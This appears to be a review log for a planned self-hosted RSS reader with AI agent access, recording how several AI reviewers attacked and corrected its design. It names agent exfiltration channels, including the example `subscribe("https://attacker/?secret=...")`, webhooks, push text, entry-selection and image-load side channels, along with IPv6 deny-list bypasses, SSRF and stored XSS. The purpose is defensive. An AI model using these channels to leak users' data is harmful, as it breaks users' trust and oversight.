# How this was checked

Treat every recommendation as a hypothesis. Nothing was built, no client was run against anything, and no user was interviewed.

## Process

| Round | Who | What |
| --- | --- | --- |
| 1, research | Devin SWE-2 max, Step-5 Preview, GLM-5.3, Mistral Large 4, MiMo V2.6 Pro, Nemotron 3 Ultra (free), Inkling Small (free) | Twelve reports across competitors, stack, API, LLM, features and UX |
| 2, synthesis | Claude Opus 5.5 | First draft, taking positions, including one against both stack reports |
| 2, attack | GPT-6.1 Sol (whole draft); SWE-2 max (sync); GLM-5.3 (stack); Step-5 Preview (security); Mistral Large 4 (product); MiMo V2.6 Pro (scope) | Adversarial review. Sol's verdict on that draft was **no** |
| 3, revision | Claude Opus 5.5 | Findings checked at source and applied, or noted below |
| 4, re-attack | Sol (whole set); SWE-2 max (replacement sync model); Step-5 Preview ("no agent exit"); Inkling Small, free (consistency) | Sol's verdict: **no**, with a shorter list. SWE-2: not yet sound enough for test vectors. Step-5 and Sol both broke the "no exit" claim |
| 5, revision | Claude Opus 5.5 | Fixes below. Sync model reclassified as a draft to be settled by an executable model at step 1 |
| 6, final check | Sol; Inkling Small, free (consistency) | Sol's verdict: **yes, fit to guide steps 0 and 1**. Not an implementation specification, and it said so. For this round Sol was asked that narrower question, because the next phase is experiments and a model, not implementation |
| 7, revision | Claude Opus 5.5 | Sol's last items applied. Two findings from the free consistency check were wrong and were not applied |
| 8, delta check | Sol | Reviewed the edits made after its verdict and found one more hole, fixed above. Yes stands for steps 0 and 1 |
| 9, review | SWE-2 max (facts, consistency); GLM-5.3-Flash (sync); MiMo V2.6 Pro (security); Mistral Large 4 (steps 0 and 1). GLM-5.3, SWE-2 high and MiMo V2.6 Pro each tried to refute another's findings | After the move to `L-K-M/Earnest`. 32 findings: 24 confirmed, 2 plausible, 6 refuted |
| 10, revision | Claude Opus 5.5 | Facts and step 0 fixed. Sync and security gaps recorded as open, not fixed |

## What the reviews changed

Draft errors the reviews caught, all confirmed against the source:

| Draft said | Reality | Found by |
| --- | --- | --- |
| No product combines self-hosting, native apps and agent access | NewsBlur does: [Mac app](https://blog.newsblur.com/2026/03/05/newsblur-v14-for-ios-and-mac/), [native apps on your own instance](https://www.newsblur.com/alternative/self-hosted-rss-reader), MCP | Sol, Mistral |
| Cadences and session ends are signature features | [Current](https://www.currentreader.app/docs/faq) already ships them | Mistral |
| "Never counts" | [Survey](https://feeder.co/blog/484-state-of-rss-survey-the-results) and [review](https://lantery.app/blog/read-state-in-feed-readers) evidence says many readers want them | Mistral |
| Watermarks by publish time | Late-arriving entries would be hidden for good. Now ordered by server `seq` | SWE-2 |
| Watermarks plus sparse exceptions | Eight failure modes; replaced by per-entry registers with an explicit conflict policy | SWE-2, Sol |
| Change feed was enough | Bootstrap, tombstones, post-restore cursors and outbox recovery were all missing | Sol, SWE-2 |
| Agents may `subscribe` | `subscribe("https://attacker/?secret=...")` is an exfiltration channel | Sol |
| Agents may hold `webhooks:write` | Same, via webhook | Step-5 |
| Every agent action is undoable | A delivered notification isn't. Reverts must check for later edits | Sol |
| Signed image proxy URLs are a control | [Miniflux shipped this SSRF](https://github.com/miniflux/v2/security/advisories/GHSA-xwh2-742g-w3wp) | Step-5 |
| Connect to the pinned IP, private ranges blocked | No IPv6 ranges, and Go's default transport can't do this | Step-5 |
| `reason` on notifications is shown as provenance | An injected agent controls it. Provenance is now server-generated | Step-5 |
| Citation checks validate claims | They prove a passage exists, not that it supports the claim | Sol |
| Compiled rules put feed content out of reach | Labels come from a model reading the article, so an article can choose its label | Step-5, Sol |
| Miniflux can be borrowed from file by file; Go for that reason | [13 internal imports in the Google Reader handler](https://github.com/miniflux/v2/blob/main/internal/googlereader/handler.go). Go stands on other grounds | GLM, Sol |
| Port the server in a couple of weeks | No evidence. Removed | Sol |
| Google Reader subset | [NetNewsWire](https://github.com/Ranchero-Software/NetNewsWire/blob/main/Modules/Account/Sources/Account/ReaderAPI/ReaderAPICaller.swift) and [Capy](https://github.com/jocmp/capyreader/blob/main/readerclient/src/main/java/com/jocmp/readerclient/GoogleReader.kt) call `rename-tag` and `disable-tag`, and neither calls `unread-count` | MiMo |
| Miniflux has no delta sync | It has [`changed_after`](https://miniflux.app/docs/api.html) | Sol |
| Cloud-hosted LLM clients need a public listener | [OpenAI's tunnel](https://developers.openai.com/api/docs/guides/secure-mcp-tunnels) doesn't | Sol |
| Gemini's free tier trains on your data | [Not for EEA, Swiss and UK users](https://ai.google.dev/gemini-api/terms) | Sol |
| M1 tokens "in the UI", before any UI; `entry.matched` before rules; This week before editions | Dependency errors. Sequence rebuilt | Sol |
| M0 was one milestone | It was three, and the agent's output had no surface | MiMo |

## What the second attack changed

Mostly defects introduced by the first round of fixes.

| Revised draft said | Reality | Found by |
| --- | --- | --- |
| An agent with only Earnest tools has "no exit" | False. `notify` sent agent text through APNs and FCM. And on-demand extraction let an agent encode secrets in *which* entries it opened, each one fetching a URL the attacker chose. Now a bounded threat model: stored content only, server-generated push payloads | Sol, Step-5 |
| Range record replayed by clients | It couldn't express which entries it skipped, so clients would diverge. Now carries its resolved result | SWE-2, Sol |
| Old `occurred_at` replaced by receipt time | Promoted stale queued writes to "now", the data loss the policy exists to prevent. Old values now stay old, with a maximum queue age | SWE-2, Sol |
| Google Reader writes are deliberate at receipt time | A week-offline client's marks outranked your native decisions. `read` is now passive | SWE-2 |
| `kept` as a `shelf` value | Starring a Later item lost its place. `kept` is now its own register | Sol |
| Mark unread via Google Reader | Left a Done item reading as read | Sol |
| Keyword terms make a rule deterministic | The author writes the text. Predicates are now limited per action | Step-5, Sol |
| Agent labels could feed rules | An agent could fire a rule by annotating. Separate namespace | Step-5 |
| Change feed recovery | A restore could re-send a delivered notification, and reused revisions could falsely match. Generation rotation, at-most-once delivery | Sol |
| Deny list | `[::]` and zoned IPv6 literals passed it. [`netip.Prefix.Contains` is false for zoned addresses](https://pkg.go.dev/net/netip#Prefix.Contains) | Sol, Step-5 |
| Authenticated feeds | Credentials could follow a cross-origin redirect | Sol |
| Annotations | Rendering was unspecified in all three clients: stored XSS if any rendered them richly. Now plain text, everywhere | Step-5 |
| Cluster-scoped state stops a story returning | Only for duplicates already ingested | SWE-2 |
| Self-hosted NewsBlur MCP "isn't stated" | [Its README documents it](https://github.com/samuelclay/NewsBlur/blob/main/README.md#self-hosted-mcp-server) | Sol |
| Schema before protocol model | Protocol decisions need settling first. Executable model is now step 1 | Sol |
| Reads being fetch-free closes selection channels | Auto-loaded images on a surfaced entry reveal the agent's choice to its publisher. New invariant | Sol |
| One fixed ntfy topic contains the step 0 agent | [ntfy clients fetch icon URLs automatically](https://docs.ntfy.sh/publish/#icons), so an `Icon` header is an exit. A wrapper now takes plain text only | Sol |
| `sandbox=""` makes links inert (a reviewer's claim) | [A sandboxed frame can still navigate itself](https://html.spec.whatwg.org/multipage/browsers.html#sandboxing) | Sol |

## What the ninth round changed

| Said | Reality | Found by |
| --- | --- | --- |
| sqlite-vec has no ANN index | [Its v0.1.10 alphas added them](https://github.com/asg017/sqlite-vec/releases). Postgres still wins | SWE-2 |
| MCP requires a stable `operation_id` | [The spec has none](https://modelcontextprotocol.io/specification/2026-07-28/changelog); a retry gets a new request ID. It's Earnest's own convention | SWE-2 |
| Step 0 pages you through ntfy | Whose ntfy was unstated, and a public server would carry the brief off the tailnet | Mistral |
| Step 0 enforces a tool allowlist | No enforcement point was named | Mistral |
| Step 0 reads with counts hidden | No method was given for NewsBlur | Mistral |
| You'll know whether NewsBlur is enough | No criterion. Now judged against what Earnest is for | Mistral |

Still open: nine sync gaps, [listed in api.md](api.md#change-feed), and six security gaps, [listed in llm.md](llm.md#open-gaps). Four minor consistency findings were confirmed but not applied; see [raw/r6-consistency.md](raw/r6-consistency.md). The six refuted findings were not applied.

## Errors in the research reports

Helpers are useful and also wrong. Caught before the first draft:

- `stack-b`: "no APNs outside the App Store". [Apple's table](https://developer.apple.com/help/account/reference/supported-capabilities-macos) lists it for Developer ID.
- `stack-b`: go-shiori/go-readability "active". It is archived.
- `competitors-hosted`: Folo is GPL-3.0. It is [AGPL-3.0](https://github.com/RSSNext/Folo).
- `clients-oss`: NetNewsWire repository "404" (wrong owner); Feeder "formerly FeedMe" (different apps).
- `llm-b`: priced `gpt-6-luna`'s rates under `gpt-5.6-luna`.
- `features`: put newsletters and podcasts in the MVP, and declared an image proxy a non-goal against both stack reports.
- `r2-product`: quoted the read-state figures loosely. Corrected against the source.
- `r3-security`: said `sandbox=""` makes links inert. Wrong; see above.
- `r3-consistency`, `r4-consistency`: reported `#safety` as a dangling anchor and folders as mis-tiered. Neither was true.

## Checked at source by the author

GitHub stars, licences and releases (API, 2026-11-01). Crate and Go module versions. MCP 2026-07-28 changelog and security practices. Go SDK protocol documentation. Apple capability table (parsed from the HTML). Inoreader, NewsBlur, Readwise and Folo pricing pages. Current, Reeder and Feedler pages. OpenAI and Anthropic prices. Miniflux schema and handler source. NetNewsWire and Capy Reader Google Reader calls. Tailscale Funnel documentation. WebSub's 2026 republication.

## Not checked

- **All sentiment evidence is weak.** Reddit blocks automated access, so quotes from it were dropped, not verified. The rest is forum posts by enthusiasts, a 2020 vendor survey, and an analysis by someone building a competitor.
- Feedly's prices (script-gated page; third-party figures). Inoreader's API quota. Tapestry, Beacon, Newsairy, CMRSS, Inkwell details.
- Whether NewsBlur's self-hosted MCP and Ask AI work in practice. They're documented, but nobody ran them.
- Whether Claude has an equivalent to OpenAI's tunnel.
- [Rachel Kroll's feed reader project](https://www.goldenhillsoftware.com/2024/08/feed-polling-for-unread-cloud/) status: her site wasn't reachable from here.
- SwiftUI list performance on current macOS. Evidence is blog-level.
- Local model throughput on your NAS. Summary quality on any model. No evaluation has been run.
- Effort estimates. All are judgement.
- The sync model. Three rounds of review found real defects, so expect more. It hasn't been implemented or modelled.
- The threat model. It has been reviewed, not proven, and each round of attack found something new, the ninth included.

## Raw reports

Every helper report is kept unedited in [raw/](raw/) for the detail this summary leaves out, such as the full idea lists and wireframes. They contain the errors listed above and others, so check anything before relying on it.

## Open disagreements

- **Go or Rust.** Sol and GLM lean Go; the two original stack reports chose Rust. Agent-written Go fails at runtime in the code that's hardest to test. Close call.
- **Per-entry state or watermarks.** SWE-2 first proposed fixing watermarks; Sol proposed starting per-entry. This document follows Sol, keeping SWE-2's ordering. It costs more rows and is simpler.
- **Range records.** Sol prefers invalidate-and-refetch; SWE-2 prefers carrying the resolved result. This document uses the resolved result, and the executable model can overturn that.
- **Agent identity.** Mistral notes that all demand is for agents acting as you. This document keeps the distinct-principal model because it enables the safety properties, and makes the cheap test come first.
- **Client order.** MiMo argues for Android first, since Kararead's reader code can be reused. Sol says to choose from daily use. This document follows Sol.
